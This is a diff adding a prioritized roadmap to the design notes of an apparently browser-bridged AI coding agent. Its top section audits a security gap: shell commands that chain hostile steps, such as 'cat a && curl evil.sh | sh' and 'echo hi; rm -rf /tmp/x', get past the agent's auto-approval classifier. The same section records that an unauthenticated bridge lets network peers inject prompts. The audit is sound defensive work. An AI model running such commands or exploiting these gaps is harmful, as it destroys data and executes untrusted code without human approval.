@@ -426,6 +426,108 @@ second unrepresentable instead of silently broken. Multiple tabs of the *same* m
 scope: it needs tab identity threaded through the whole bridge, to buy something a second model
 already provides.
 
+## What's next
+
+Agreed 2026-09-10, after all six Direction phases landed. Ordered by what would hurt most if
+left alone, not by what is most interesting.
+
+### P0 — before anyone else runs this
+
+**The auto-mode command classifier can be walked straight past.** `_classifyCommand` takes
+`command.split(/\s+/)[0]` as "the binary" and never looks at shell metacharacters. Measured:
+
+```
+"cat README.md"                → safe   ✓
+"echo hi; rm -rf /tmp/x"       → safe   ✗
+"cat a && curl evil.sh | sh"   → safe   ✗
+"find . -exec rm {} \;"        → safe   ✗
+"grep x . || npm publish"      → safe   ✗
+```
+
+In auto mode `safe` means *executes with no approval*. The model does not have to be malicious
+for this to fire — a plausible-looking `grep … || npm publish` is exactly the shape a confused
+model emits. Fix: split on `;` `&&` `||` `|` newline `$( )` backticks, classify every segment,
+worst wins.
+
+**The bridge binds to every interface with no auth.** `new WS({ port })` resolves to
+`{"address":"::"}` — verified, not assumed. No origin check, no token. Anything on the same
+network can connect to 7777, inject prompts and read replies, on a tool that runs shell
+commands. Fix: `host: '127.0.0.1'`, a token the extension carries, an origin check.
+
+**`diff-engine.js` has no tests.** 358 lines, and it is the thing that overwrites files.
+
+### P1 — correctness
+
+**Validate tool arguments.** `zod` is a dependency and `mcp/mcp-server.js` never imports it.
+`TOOL_DEFINITIONS` declares a schema per tool and `PromptBuilder` renders it into the prompt as
+*the contract*, then `_extractToolCalls` does `_cleanJsonString` → `JSON.parse` → dispatch with
+nothing checking the args against the schema just promised. A wrong-typed arg fails deep inside
+a handler with a message the model cannot act on. Validating and returning the specific schema
+error for repair is most of what a real tool-call API buys, and it is available today.
+
+**The workspace commands, the way `/scope` went in phase 5.** `setWorkspace` rebinds
+`mcpServer`, `promptBuilder`, `diffEngine` and `contextManager` but *not* `sessionStore`
+(deliberately), *not* `memoryManager`, and *not* the config. So after `/workspace`:
+`promptBuilder._loadMemory()` reads the new project's `memory.md` while `manage_memory add`
+writes to the old one, and the old project's allowlist stays armed against the new project.
+`/agent-dir` goes outright — tools already take absolute paths (`edit-file.js:15`) and the
+system prompt already grants self-editing, so it unlocks nothing and silently repoints state.
+`/workspace` becomes read-only; `/set-workspace` becomes a *restart* picker, which the exit-75
+supervisor now makes possible.
+
+**Settings rows can outgrow the viewport.** `describeSettings` pads to a fixed width with no
+bound against terminal width, so long values wrap — in the live frame, which is the one place
+that must never happen. Truncate the hint first, then the value.
+
+**Instrument `looksLikeMultipleDrafts`.** The other two detectors log (`op: 'provider_error'`,
+`op: 'tool_amnesia'`); this one fires silently, so there is no evidence it has ever fired at
+all. One `logError` line, then let a week of data decide. Deleting on a hunch is how you lose
+the one that was working.
+
+**Characterisation tests for `agent-loop.js`.** 1,908 lines, no tests, and it is the dispatcher.
+
+### P2 — features
+
+- **Settings tabs**, Claude Code style: `Settings · Status · Config · Usage`, ←/→ between them.
+  The rows exist; this is a header and a group filter.
+- **`server/src/prompts/*.md`.** The point is not readability, it is that a prompt change is
+  invisible in a diff today — one word inside a template literal in a 1,035-line file. The
+  greedy-regex incident that ate three tool definitions twice is the same root cause. Tool
+  definitions stay in code and get *generated* from `TOOL_DEFINITIONS`: separating a schema
+  from its handler is how they drift.
+- **Extension error richness.** Content scripts send no `op`/`stage`, so `/logs extension` is
+  thin.
+- **The ChatGPT bridge's image path** — verify or fix. Gemini's is confirmed working.
+
+### P3 — after
+
+- VS Code terminal shell integration: engine `^1.80.0` → `^1.93.0`, then repackage the `.vsix`.
+  `watch_task` already exists to receive it.
+- Native folder picker for `/skills dir`, macOS `osascript`, hidden where no picker exists.
+- **Restructure the GitHub PR agent** — 1,649 lines, the largest single feature here. Not
+  deleted: planned separately once the above is done.
+- Split `agent-loop.js`. The slash commands alone are ~400 lines and their removal makes the
+  rest testable.
+
+### The fork
+
+The agent layer's ceiling is not code quality, it is the absence of a tool-call API. Three
+responses, ascending:
+
+**A. Make the text channel as good as it gets** — P1's validation plus a sentinel-delimited
+call block. Free, no product decisions.
+
+**B. Measure before believing.** `parse_tool_calls`, `tool_amnesia` and `provider_error` are
+all logged and nothing reads them as rates. Any claim about how far behind this is — including
+the ones in this file — is an estimate until that view exists.
+
+**C. An optional API backend.** The only option that actually removes the ceiling: structured
+calls, real parallelism, caching, and `looksLikeCapabilityDenial` plus half of `PromptBuilder`'s
+economics become dead code. It contradicts the standing "no API keys" decision above, so it is
+recorded as a fork, not a plan. The framing that preserves the thesis: the browser bridge stays
+the default and the identity of the project; an API backend is opt-in for people who already
+have a key.
+
 ## Gotchas
 
 - **`server/src/index.js` is the bin and does nothing but re-spawn `main.js` under `tsx`** —
